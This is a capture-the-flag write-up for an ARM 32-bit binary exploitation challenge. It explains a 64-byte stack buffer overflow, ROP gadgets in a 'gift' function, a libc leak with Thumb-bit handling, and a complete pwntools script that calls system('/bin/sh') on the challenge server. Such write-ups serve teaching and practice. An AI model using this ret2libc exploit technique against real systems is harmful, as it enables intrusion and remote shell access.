# 🧠 Baby Jumps — ARM Pwn Writeup

**Category:** Pwn  
**Difficulty:** Medium  
**Architecture:** ARM 32-bit  
**Protections:** NX, No Canary, No PIE  

---

## 📜 Description

We are given an ARM binary (`chall`) with its `libc.so.6`. The service is accessible via:

```bash
nc 34.123.57.171 45136
```

Goal: Exploit the binary to retrieve the flag.

---

## 🔍 Initial Analysis

```bash
checksec chall
```

```
Arch:       arm-32-little
RELRO:      Partial RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        No PIE (0x10000)
```

### ⚠️ Observations

- ❌ No stack canary → buffer overflow possible  
- ❌ No PIE → fixed addresses  
- ✅ NX enabled → no shellcode, must use ROP  
- ✅ ARM architecture → must handle Thumb mode  

---

## 🔬 Reverse Engineering

```bash
nm -n chall
```

Key functions:

```
0x10534  gift
0x1055c  vuln
0x105b0  main
```

---

## 🚨 Vulnerability

Disassembly of `vuln`:

```asm
sub sp, sp, #64
...
sub r3, r11, #68
mov r2, #256
mov r1, r3
mov r0, #0
bl read
```

### 💥 Bug

- Buffer size: **64 bytes**
- Read size: **256 bytes**

➡️ Stack buffer overflow

---

## 📏 Offset Calculation

Function epilogue:

```asm
pop {r11, pc}
```

Stack layout:

| Offset | Content        |
|--------|----------------|
| 0–63   | buffer         |
| 64–67  | saved r11      |
| 68–71  | saved pc       |

➡️ **Offset to PC = 68 bytes**

---

## 🎁 The `gift` Function

```asm
0x10540: pop {r3, pc}
0x10544: pop {r0, lr}
0x10548: bx  r3
```

### 🔥 Primitive

This gives us:

```c
call(r3, r0)
```

➡️ Arbitrary function call with 1 argument

---

## 🧠 Exploitation Strategy

### Stage 1 — Leak libc

We call:

```c
puts(read@got)
```

### Payload

```python
payload  = b"A"*64
payload += p32(0x41414141)
payload += p32(0x10540)           # pop {r3, pc}
payload += p32(puts@plt)
payload += p32(0x10544)           # pop {r0, lr}
payload += p32(read@got)
payload += p32(main)
```

---

## 📤 Leak Result

```
raw read leak = 0x3ff436e1
```

### ⚠️ ARM Thumb Handling

```python
read_leak &= ~1
```

---

## 🧮 Compute libc base

```python
libc.address = read_leak - (libc.sym['read'] & ~1)
```

```
libc base = 0x3fea0000
```

---

## 🚀 Stage 2 — Get Shell

We call:

```c
system("/bin/sh")
```

### Payload

```python
payload  = b"A"*64
payload += p32(0x41414141)
payload += p32(0x10540)
payload += p32(system)
payload += p32(0x10544)
payload += p32(binsh)
payload += p32(main)
```

---

## 🐚 Shell

```
/bin/sh: 0: can't access tty; job control turned off
```

Then:

```bash
ls
cat flag.txt
```

---

## 🏁 Flag

```
NSC{83af4e336ac3cc48907074d90c2401e8}}
```

---

## 🧾 Full Exploit

```python
from pwn import *

context.arch = 'arm'
context.endian = 'little'
context.os = 'linux'

HOST = '34.123.57.171'
PORT = 45136

elf = ELF('./chall')
libc = ELF('./libc.so.6')

MAIN      = 0x105b0
POP_R3_PC = 0x10540
POP_R0_LR = 0x10544

def leak_payload(got_addr):
    payload  = b'A'*64
    payload += p32(0x41414141)
    payload += p32(POP_R3_PC)
    payload += p32(elf.plt['puts'])
    payload += p32(POP_R0_LR)
    payload += p32(got_addr)
    payload += p32(MAIN)
    return payload

def call1_payload(func_addr, arg_addr):
    payload  = b'A'*64
    payload += p32(0x41414141)
    payload += p32(POP_R3_PC)
    payload += p32(func_addr)
    payload += p32(POP_R0_LR)
    payload += p32(arg_addr)
    payload += p32(MAIN)
    return payload

io = remote(HOST, PORT)

# Stage 1
io.recvuntil(b"Leave your mark on this system:\n")
io.send(leak_payload(elf.got['read']))

data = io.recvuntil(b"=== ARM Gadget Gauntlet ===")

marker = b"Received.\n"
idx = data.find(marker)

leak_blob = data[idx + len(marker):]
leak_blob = leak_blob.split(b"\n=== ARM Gadget Gauntlet ===")[0]

read_leak = u32(leak_blob[:4].ljust(4, b'\x00'))
read_leak &= ~1

libc.address = read_leak - (libc.sym['read'] & ~1)

# Stage 2
system = libc.sym['system']
binsh  = next(libc.search(b'/bin/sh\x00'))

io.recvuntil(b"Leave your mark on this system:\n")
io.send(call1_payload(system, binsh))

io.sendline(b"cat flag.txt")
io.interactive()
```

---

## 🧠 Key Takeaways

- ARM exploitation requires handling **Thumb bit**
- `pop {rX, pc}` → powerful gadgets
- Minimal gadgets → still full control
- Avoid double-adding libc base
- Always validate leaks before exploitation

---

🔥 Clean exploit, solid ARM fundamentals.
